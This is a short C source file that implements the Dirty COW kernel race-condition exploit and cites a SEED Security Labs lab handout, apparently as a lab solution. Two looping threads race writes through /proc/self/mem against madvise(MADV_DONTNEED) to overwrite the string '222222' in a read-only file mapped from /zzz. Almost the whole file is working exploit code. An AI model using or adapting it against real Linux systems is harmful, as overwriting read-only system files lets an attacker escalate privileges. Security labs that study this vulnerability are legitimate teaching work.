#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
/**
 * https://seedsecuritylabs.org/Labs_16.04/PDF/Dirty_COW.pdf
 */

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1, pth2;
  struct stat st;
  int file_size;

  int f = open("/zzz", O_RDONLY);

  fstat(f, &st);
  file_size = st.st_size;
  map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  char *position = strstr(map, "222222");

  pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
  pthread_create(&pth2, NULL, writeThread, position);

  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content = "******";
  off_t offset = (off_t)arg;

  int f = open("/proc/self/mem", O_RDWR);
  while (1)
  {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int)arg;
  while (1)
  {
    madvise(map, file_size, MADV_DONTNEED);
  }
}
